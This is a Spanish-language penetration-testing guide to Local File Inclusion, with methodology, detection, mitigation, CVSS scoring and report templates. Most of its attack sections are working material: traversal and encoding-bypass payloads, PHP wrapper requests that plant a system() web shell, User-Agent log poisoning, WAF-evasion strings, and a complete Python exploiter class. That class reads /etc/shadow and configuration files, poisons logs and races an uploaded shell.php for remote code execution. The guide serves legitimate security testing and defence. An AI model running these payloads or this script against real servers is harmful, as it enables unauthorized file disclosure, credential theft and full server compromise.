# Inclusión Local de Archivos (LFI)

## Resumen

La vulnerabilidad LFI permite a atacantes leer archivos arbitrarios del sistema de ficheros del servidor mediante manipulación de parámetros que referencian archivos. La aplicación utiliza input del usuario para construir rutas sin validación adecuada, exponiendo código fuente, credenciales y datos sensibles. Aplica cuando endpoints incluyen o procesan archivos basándose en entrada controlada por el usuario sin sanitización apropiada.[^3]

## Contexto

Las pruebas requieren navegador con herramientas de desarrollo, proxy como Burp Suite para manipular parámetros, y conocimiento de estructuras de directorios Linux/Windows. Los entornos modernos incluyen aplicaciones PHP con wrappers habilitados, servidores con logs accesibles y sistemas con configuraciones inseguras. Las técnicas avanzadas involucran condiciones de carrera para escalada a RCE y bypass de validaciones mediante encoding.[^7]

## Metodología

### Identificación de Puntos de Entrada Vulnerables

1. **Mapear parámetros de archivo**
   - URLs con referencias: `file=`, `page=`, `include=`, `template=`
   - Parámetros de descarga: `download=`, `doc=`, `pdf=`
   - Campos de configuración: `config=`, `lang=`, `style=`
   - APIs que procesan rutas: `/api/files/{path}`
2. **Análisis de estructura de aplicación**[^8]
   - Identificar directorio web root (`/var/www/html`, `C:\inetpub\wwwroot`)
   - Mapear estructura de archivos sensibles
   - Detectar tecnología backend (PHP, Java, .NET)
   - Verificar permisos de proceso web
3. **Testeo de traversal básico**[^9]
   - Probar secuencias `../` para Linux/Unix
   - Usar `..\\` para sistemas Windows
   - Calcular niveles necesarios mediante errores
   - Verificar acceso a archivos conocidos (`/etc/passwd`, `C:\Windows\win.ini`)

### Checklist de Verificación

- [ ]  Identificar parámetros que referencien archivos o rutas
- [ ]  Testear directory traversal con `../` y `..\\`
- [ ]  Probar bypass de filtros mediante encoding
- [ ]  Verificar escalada mediante PHP wrappers[^4]
- [ ]  Evaluar log poisoning para RCE[^11]
- [ ]  Confirmar acceso a archivos sensibles del sistema

## Pruebas Manuales

### Configuración Inicial

Usar Burp Suite para interceptar requests con parámetros de archivo. Analizar respuestas y errores para determinar estructura del sistema.

### Casos de Prueba Básicos

**Caso 1: Directory Traversal simple**

```http
# Request normal
GET /download.php?file=documento.pdf HTTP/1.1
Host: victima.com

# Traversal básico Linux
GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: victima.com

# Traversal básico Windows  
GET /download.php?file=..\..\..\..\Windows\win.ini HTTP/1.1
Host: victima.com
```

**Caso 2: Bypass de extensión forzada**[^4]

```http
# Si aplicación añade .php automáticamente
GET /include.php?page=../../../../etc/passwd%00 HTTP/1.1
Host: victima.com

# Null byte para truncar extensión
GET /view.php?template=../../config/database%00.php HTTP/1.1
Host: victima.com
```

### Técnicas de Bypass Avanzadas

**Encoding múltiple:**[^12]

```http
# URL encoding simple
file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Doble encoding
file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode overlong
file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
```

**Bypass de filtros recursivos:**

```http
# Si filtro elimina ../
file=....//....//....//etc/passwd

# Si filtro no es recursivo
file=..././..././..././etc/passwd
```

### PHP Wrappers para Escalada[^4]

**php://filter para lectura:**

```http
GET /include.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: victima.com
```

**php://input para RCE:**

```http
POST /include.php?page=php://input HTTP/1.1
Host: victima.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

<?php system($_GET['cmd']); ?>
```

### Evidencias Mínimas

- Screenshots de archivos sensibles accedidos (`/etc/passwd`, logs)
- Contenido de archivos de configuración con credenciales
- Código fuente de aplicación revelando lógica interna
- Confirmación de RCE mediante wrappers o log poisoning

## PoC

### Manual: Lectura de Archivo Sensible

**Objetivo:** Demostrar acceso no autorizado a archivos del sistema

**Pasos:**

1. Identificar parámetro vulnerable: `?file=` en victima.com
2. Probar traversal básico: `?file=../../../../etc/passwd`
3. Analizar respuesta para confirmar acceso exitoso
4. Documentar contenido de archivo accedido
5. Intentar acceso a archivos de configuración críticos

**Resultado Esperado:** Lectura exitosa de `/etc/passwd` o archivos similares

### Manual: Log Poisoning para RCE

**Objetivo:** Escalar LFI a ejecución remota de código

**Pasos:**

1. Confirmar LFI puede acceder logs: `?file=/var/log/apache2/access.log`
2. Envenenar logs con código PHP malicioso via User-Agent
3. Incluir log envenenado mediante LFI
4. Ejecutar comandos remotos y confirmar RCE

### Automatizada: Script de Detección y Explotación

```python
import requests
import base64
import threading
import time
from urllib.parse import urlencode, quote
import concurrent.futures

class LFIExploiter:
    """
    Detector y explotador automatizado de vulnerabilidades LFI
    """
  
    def __init__(self, base_url, vulnerable_param):
        self.base_url = base_url
        self.param = vulnerable_param
        self.session = requests.Session()
  
        # Payloads de prueba comunes
        self.linux_files = [
            '/etc/passwd',
            '/etc/shadow', 
            '/etc/hosts',
            '/proc/version',
            '/proc/self/environ',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/www/html/config.php'
        ]
  
        self.windows_files = [
            'C:\\Windows\\win.ini',
            'C:\\Windows\\system32\\drivers\\etc\\hosts',
            'C:\\boot.ini',
            'C:\\inetpub\\wwwroot\\web.config'
        ]
  
        # Técnicas de bypass
        self.traversal_payloads = [
            '../' * 6,
            '..\\' * 6,
            '%2e%2e%2f' * 6,
            '%252e%252e%252f' * 6,
            '....//....//....//....//....//..../',
            '%c0%ae%c0%ae%c0%af' * 6
        ]
  
    def test_basic_lfi(self, target_files):
        """
        Prueba LFI básico con archivos objetivo
        """
        vulnerable_files = []
  
        for target_file in target_files:
            for traversal in self.traversal_payloads:
                payload = traversal + target_file.lstrip('/')
          
                try:
                    response = self.session.get(
                        self.base_url,
                        params={self.param: payload},
                        timeout=10
                    )
              
                    # Detectar lectura exitosa
                    if self._is_file_read_successful(response, target_file):
                        vulnerable_files.append({
                            'file': target_file,
                            'payload': payload,
                            'content_preview': response.text[:500],
                            'method': 'basic_traversal'
                        })
                        print(f"[+] LFI confirmado: {target_file} con payload {payload}")
                        break
                  
                except requests.RequestException as e:
                    continue
  
        return vulnerable_files
  
    def test_php_wrappers(self):
        """
        Prueba wrappers PHP para lectura y RCE
        """
        vulnerable_wrappers = []
  
        # Wrapper php://filter
        filter_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=config.php',
            'php://filter/resource=/etc/passwd'
        ]
  
        for payload in filter_payloads:
            try:
                response = self.session.get(
                    self.base_url,
                    params={self.param: payload},
                    timeout=10
                )
          
                if response.status_code == 200 and len(response.text) > 100:
                    # Intentar decodificar base64 si aplica
                    if 'base64-encode' in payload:
                        try:
                            decoded = base64.b64decode(response.text).decode('utf-8')
                            if '<?php' in decoded:
                                vulnerable_wrappers.append({
                                    'wrapper': payload,
                                    'type': 'php_filter_source_disclosure',
                                    'decoded_content': decoded[:500]
                                })
                                print(f"[+] PHP Filter funciona: {payload}")
                        except:
                            pass
                    else:
                        vulnerable_wrappers.append({
                            'wrapper': payload,
                            'type': 'php_filter_read',
                            'content': response.text[:500]
                        })
                  
            except requests.RequestException:
                continue
  
        # Wrapper php://input para RCE
        if self._test_php_input_rce():
            vulnerable_wrappers.append({
                'wrapper': 'php://input',
                'type': 'rce_via_input',
                'description': 'RCE confirmado via php://input'
            })
  
        return vulnerable_wrappers
  
    def test_log_poisoning(self, log_files=['/var/log/apache2/access.log']):
        """
        Intenta log poisoning para RCE
        """
        poisoning_results = []
  
        for log_file in log_files:
            # Primero verificar acceso al log
            if not self._can_access_file(log_file):
                continue
          
            # Envenenar log con código PHP
            poison_payload = '<?php system($_GET["cmd"]); ?>'
      
            try:
                # Envenenar via User-Agent
                self.session.get(
                    self.base_url,
                    headers={'User-Agent': poison_payload},
                    timeout=5
                )
          
                # Intentar ejecutar comando via log envenenado
                cmd_payload = '../' * 6 + log_file.lstrip('/') + '&cmd=id'
          
                response = self.session.get(
                    self.base_url,
                    params={self.param: cmd_payload},
                    timeout=10
                )
          
                if 'uid=' in response.text and 'gid=' in response.text:
                    poisoning_results.append({
                        'log_file': log_file,
                        'method': 'user_agent_poisoning',
                        'rce_confirmed': True,
                        'command_output': response.text[:300]
                    })
                    print(f"[+] Log Poisoning RCE exitoso en {log_file}")
              
            except requests.RequestException:
                continue
          
        return poisoning_results
  
    def race_condition_exploit(self, upload_endpoint=None):
        """
        Explota condiciones de carrera para RCE
        """
        if not upload_endpoint:
            return []
      
        race_results = []
  
        def upload_shell():
            # Subir shell PHP con bytes mágicos si requerido
            shell_content = b'fakeapp<?php system($_GET["cmd"]); ?>'
            files = {'file': ('shell.php', shell_content, 'text/plain')}
      
            try:
                response = self.session.post(upload_endpoint, files=files, timeout=5)
                return response.status_code == 200
            except:
                return False
  
        def access_shell():
            # Intentar acceder al shell subido
            try:
                response = self.session.get(
                    f"{self.base_url}?{self.param}=shell.php&cmd=id",
                    timeout=2
                )
                return 'uid=' in response.text
            except:
                return False
  
        # Ejecutar race condition con hilos
        for attempt in range(50):
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                upload_future = executor.submit(upload_shell)
                access_future = executor.submit(access_shell)
          
                upload_result = upload_future.result()
                access_result = access_future.result()
          
                if upload_result and access_result:
                    race_results.append({
                        'method': 'race_condition_upload',
                        'attempt': attempt,
                        'rce_confirmed': True
                    })
                    print(f"[+] Race condition RCE exitoso en intento {attempt}")
                    break
              
            time.sleep(0.1)
  
        return race_results
  
    def _is_file_read_successful(self, response, target_file):
        """
        Determina si la lectura del archivo fue exitosa
        """
        if response.status_code != 200:
            return False
      
        content = response.text.lower()
  
        # Indicadores por tipo de archivo
        if 'passwd' in target_file:
            return 'root:' in content or 'bin:' in content or 'daemon:' in content
        elif 'win.ini' in target_file:
            return '[fonts]' in content or '[extensions]' in content
        elif 'hosts' in target_file:
            return 'localhost' in content or '127.0.0.1' in content
        elif 'config' in target_file:
            return 'password' in content or 'database' in content or 'key' in content
      
        return len(response.text) > 50 and 'error' not in content
  
    def _can_access_file(self, file_path):
        """
        Verifica si se puede acceder a un archivo
        """
        payload = '../' * 6 + file_path.lstrip('/')
  
        try:
            response = self.session.get(
                self.base_url,
                params={self.param: payload},
                timeout=5
            )
            return response.status_code == 200 and len(response.text) > 50
        except:
            return False
  
    def _test_php_input_rce(self):
        """
        Prueba RCE via php://input
        """
        try:
            response = self.session.post(
                self.base_url,
                params={self.param: 'php://input'},
                data='<?php echo "LFI_RCE_TEST"; ?>',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            return 'LFI_RCE_TEST' in response.text
        except:
            return False
  
    def comprehensive_scan(self):
        """
        Escaneo completo de LFI con todas las técnicas
        """
        print("[*] Iniciando escaneo comprehensivo de LFI...")
  
        results = {
            'basic_lfi': [],
            'php_wrappers': [],
            'log_poisoning': [],
            'race_conditions': []
        }
  
        # Test LFI básico
        print("[*] Probando LFI básico en archivos Linux...")
        results['basic_lfi'].extend(self.test_basic_lfi(self.linux_files))
  
        print("[*] Probando LFI básico en archivos Windows...")  
        results['basic_lfi'].extend(self.test_basic_lfi(self.windows_files))
  
        # Test PHP wrappers
        print("[*] Probando PHP wrappers...")
        results['php_wrappers'] = self.test_php_wrappers()
  
        # Test log poisoning
        print("[*] Probando log poisoning...")
        results['log_poisoning'] = self.test_log_poisoning()
  
        # Test race conditions (requiere endpoint de subida)
        # results['race_conditions'] = self.race_condition_exploit('/upload.php')
  
        total_vulns = sum(len(v) if isinstance(v, list) else 1 if v else 0 for v in results.values())
        print(f"[*] Escaneo completado. Encontradas {total_vulns} vulnerabilidades LFI")
  
        return results

# Uso del explotador
if __name__ == "__main__":
    # Configurar objetivo
    target_url = "https://victima.com/vulnerable.php"
    param_name = "file"
  
    exploiter = LFIExploiter(target_url, param_name)
    vulnerabilities = exploiter.comprehensive_scan()
  
    # Generar reporte
    import json
    with open('lfi_report.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=2)
  
    print("[*] Reporte guardado en lfi_report.json")
```

## Explotación/Automatización

### Técnicas de Bypass WAF[^14]

**Case variation:**

```http
# Alternar mayúsculas/minúsculas
file=..%2F..%2F..%2FetC%2FpaSSwd

# Mezclar encoding
file=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd
```

**Fragmentación de payloads:**

```python
# Dividir payload en múltiples parámetros
payload1 = "../../../"
payload2 = "etc/passwd"
url = f"?part1={payload1}&part2={payload2}"
```

### Condiciones de Carrera[^15]

Explotar ventanas temporales entre subida y validación:

```python
import threading
import requests

def race_lfi_rce(upload_url, lfi_url):
    def upload_shell():
        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'text/plain')}
        requests.post(upload_url, files=files)
  
    def execute_shell():
        time.sleep(0.01)  # Timing crítico
        response = requests.get(f"{lfi_url}?file=uploads/shell.php&c=id")
        return 'uid=' in response.text
  
    # Ejecutar concurrentemente
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=execute_shell) 
  
    t1.start()
    t2.start()
  
    return execute_shell()
```

### Herramientas Automatizadas[^17]

**LFISuite:**

- Detección automatizada con múltiples payloads
- Bypass de filtros mediante encoding
- Escalada automática a RCE

**ffuf con wordlists específicas:**[^18]

```bash
ffuf -u "https://victima.com/app.php?FUZZ=../../../etc/passwd" \
     -w lfi_payloads.txt \
     -fw 485  # Filtrar respuestas con 485 palabras
```

## Impacto

### Escenario Real

Un atacante explota LFI en aplicación web para leer `/etc/passwd` y archivos de configuración, obteniendo credenciales de base de datos. Mediante log poisoning escala a RCE y compromete completamente el servidor. La fuga incluye código fuente de aplicación revelando otras vulnerabilidades críticas.[^1]

### Mapeo de Seguridad

- **OWASP:** A03:2021 - Injection, A05:2021 - Security Misconfiguration
- **CWE:** CWE-22 - Path Traversal, CWE-98 - PHP File Inclusion
- **CVSS v3.1:** Rango típico 6.0-9.0 (Medio-Crítico)[^20]

### Severidad CVSS

Para LFI con lectura de archivos sensibles:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Puntuación Base: 7.5
```

Para escalada LFI a RCE:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Puntuación Base: 9.8
```

## Detección

### Logs de Aplicación

Implementar logging de:

- Requests con secuencias `../` o `..\\` en parámetros
- Accesos a archivos fuera del directorio web esperado
- Patrones de directory traversal en URLs
- Uso de wrappers PHP sospechosos (`php://`, `data://`)[^4]

### WAF/Proxy[^21]

Configurar reglas para detectar:

- Sequences de traversal comunes y sus encodings
- Acceso a archivos sensibles conocidos (`/etc/passwd`, logs)
- Wrappers PHP maliciosos en parámetros
- Patrones de log poisoning (código PHP en User-Agent)

### Monitoreo de Sistema

Implementar:

- Alertas por acceso anómalo a archivos críticos
- Monitoreo de procesos con comportamiento sospechoso
- Detección de modificaciones en logs del sistema
- Análisis de tráfico con patrones LFI[^21]

## Mitigación

### Fix Principal

Implementar validación estricta de entrada:

```php
<?php
// Configuración segura contra LFI
function secure_file_include($user_input) {
    // Whitelist de archivos permitidos
    $allowed_files = [
        'home' => 'templates/home.php',
        'about' => 'templates/about.php', 
        'contact' => 'templates/contact.php'
    ];
  
    // Validar contra whitelist
    if (!array_key_exists($user_input, $allowed_files)) {
        throw new Exception("Archivo no permitido");
    }
  
    // Usar ruta canónica y verificar
    $file_path = realpath($allowed_files[$user_input]);
    $base_path = realpath(__DIR__ . '/templates/');
  
    // Verificar que esté dentro del directorio base
    if (strpos($file_path, $base_path) !== 0) {
        throw new Exception("Acceso denegado");  
    }
  
    return $file_path;
}

// Uso seguro
try {
    $safe_file = secure_file_include($_GET['page']);
    include($safe_file);
} catch (Exception $e) {
    echo "Error: Página no encontrada";
}
?>
```

### Controles Adicionales

1. **Configuración de PHP segura**[^5]
   - Deshabilitar `allow_url_include` y `allow_url_fopen`
   - Remover wrappers peligrosos (`expect://`, `php://input`)
   - Configurar `open_basedir` para restriccir acceso
2. **Principio de menor privilegio**[^8]
   - Ejecutar servidor web con usuario de bajos privilegios
   - Limitar acceso de lectura solo a directorios necesarios
   - Usar chroot jail cuando sea posible
3. **Hardening de sistema**
   - Proteger archivos sensibles con permisos restrictivos
   - Rotar y asegurar logs del sistema
   - Implementar AppArmor/SELinux para restricciones adicionales

### Pruebas Post-Fix

- Verificar que solo archivos whitelistados son accesibles
- Confirmar que traversal con `../` es bloqueado efectivamente
- Testear que wrappers PHP no funcionan en parámetros
- Validar que logs no pueden ser envenenados exitosamente

## Errores Comunes

### Falsos Positivos[^21]

- Confundir errores de aplicación con acceso exitoso a archivos
- Reportar responses 200 sin confirmar contenido de archivo
- Asumir LFI sin verificar lectura real de datos sensibles
- No distinguir entre path traversal y file inclusion real[^9]

### Límites de Testing

- Aplicaciones con validación estricta de whitelist
- Sistemas con `open_basedir` configurado correctamente
- WAFs avanzados con detección de patrones LFI[^14]
- Servidores hardened con permisos restrictivos

## Reporte

### Título

"Inclusión Local de Archivos (LFI) - Acceso No Autorizado al Sistema de Ficheros"

### Resumen Ejecutivo

La aplicación permite inclusión no autorizada de archivos locales mediante manipulación de parámetros, exponiendo archivos sensibles del sistema y potencialmente escalando a ejecución remota de código.

### Pasos de Reproducción

1. Identificar parámetro vulnerable que referencia archivos
2. Enviar payload de directory traversal: `?file=../../../../etc/passwd`
3. Confirmar lectura exitosa de archivo del sistema
4. Intentar escalada mediante PHP wrappers o log poisoning
5. Demostrar acceso a archivos de configuración críticos

### Evidencias

- Screenshots de `/etc/passwd` accedido exitosamente
- Contenido de archivos de configuración con credenciales
- Código fuente de aplicación revelado via php://filter
- Logs de comandos ejecutados via log poisoning (si aplica)

### Mitigación Recomendada

Implementar validación estricta con whitelist de archivos permitidos, usar `realpath()` para canonicalización de rutas, deshabilitar wrappers PHP peligrosos y aplicar principio de menor privilegio al proceso del servidor web.


[^1]: https://virtualcyberlabs.com/local-file-inclusion-lfi/
    
[^2]: https://atlansec.es/blog/posts/06-04-2025/
    
[^3]: https://www.invicti.com/learn/local-file-inclusion-lfi/
    
[^4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion
    
[^5]: https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/
    
[^6]: https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html
    
[^7]: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
    
[^8]: https://www.fastly.com/blog/back-to-basics-directory-traversal
    
[^9]: https://www.invicti.com/learn/directory-traversal-path-traversal/
    
[^10]: https://www.invicti.com/blog/web-security/php-stream-wrappers/
    
[^11]: https://infosecwriteups.com/rce-via-lfi-oscp-tactics-for-code-execution-and-gaining-a-foothold-on-a-system-b35d0655f3c7
    
[^12]: https://nsfocusglobal.com/path-traversal-attack-protection/
    
[^13]: https://www.slideshare.net/slideshow/waf-bypassing-techniques/64302972
    
[^14]: https://bugbase.ai/blog/top-10-ways-to-bypass-waf
    
[^15]: https://bogner.sh/2018/04/race-to-rce-there-is-more-on-the-web-than-just-xss/
    
[^16]: https://github.com/topics/lfi-detection?o=asc\&s=updated
    
[^17]: https://www.acunetix.com/vulnerability-scanner/lfi-vulnerability-scanner/
    
[^18]: https://stackoverflow.com/questions/64088681/how-to-test-and-exploit-lfi-vulnerabilities
    
[^19]: https://www.brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/
    
[^20]: https://www.avertium.com/flash-notices/wordpress-review-plugin-local-file-inclusion
    
[^21]: https://support.polarisec.com/en/docs/general-knowledge/lfi-and-rfi-attacks/
    
[^22]: https://github.com/advisories/GHSA-qq86-38fr-rcf3
    
[^23]: https://nvd.nist.gov/vuln/detail/CVE-2025-49138
    
[^24]: https://github.com/advisories/GHSA-p75g-cxfj-7wrx
    
[^25]: https://www.cvedetails.com/cve/CVE-2025-51057/
    
[^26]: https://owasp.org/www-community/attacks/Path_Traversal
    
[^27]: https://www.exploit-db.com/exploits/52125
    
[^28]: https://portswigger.net/web-security/file-path-traversal
    
[^29]: https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/
    
[^30]: https://nvd.nist.gov/vuln/detail/CVE-2025-26905
    
[^31]: https://techbrunch.github.io/patt-mkdocs/Directory Traversal/
    
[^32]: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/
    
[^33]: https://www.cve.org/cverecord?id=CVE-2025-0632
    
[^34]: https://www.aikido.dev/blog/path-traversal-in-2024-the-year-unpacked
    
[^35]: https://patchstack.com/articles/critical-lfi-to-rce-vulnerability-in-wp-ghost-plugin-affecting-200k-sites/
    
[^36]: https://wpscan.com/vulnerability/7570bd32-f660-44e7-abc6-5d4ea369fe30/
    
[^37]: https://advisories.checkpoint.com/defense/advisories/public/2024/cpai-2024-0395.html/
    
[^38]: https://deephacking.tech/php-wrappers-pentesting-web/
    
[^39]: https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion
    
[^40]: https://brightsec.com/blog/local-file-inclusion-lfi/
    
[^41]: https://4geeks.com/lesson/local-file-inclusion-remote-file-inclusion
    
[^42]: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
    
[^43]: https://github.com/topics/lfi-scanner
    
[^44]: https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks
    
[^45]: https://medium.verylazytech.com/enhancing-your-understanding-of-local-file-inclusion-lfi-35a26f9efadd
    
[^46]: https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki
    
[^47]: https://fluidattacks.com/es/advisories/silva
    
[^48]: https://hackmd.io/@Solderet/list/%2FgZFHwwuQQo6ya_Q6ULYrdA
    
[^49]: https://www.scribd.com/document/857621425/Advanced-LFI-Bypass-Techniques
    
[^50]: https://gynvael.coldwind.pl/?id=418
    
[^51]: https://waf-bypass.com/2025/03/page/2/
    
[^52]: https://help.fortinet.com/fweb/605/Content/FortiWeb/fortiweb-admin/web_protection.htm
    
[^53]: https://www.youtube.com/watch?v=5g137gsB9Wk
    
[^54]: https://infosecwriteups.com/️-how-to-bypass-web-application-firewalls-wafs-8346e6e79dd3
    
[^55]: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/783
    
[^56]: https://waf-bypass.com/2025/05/
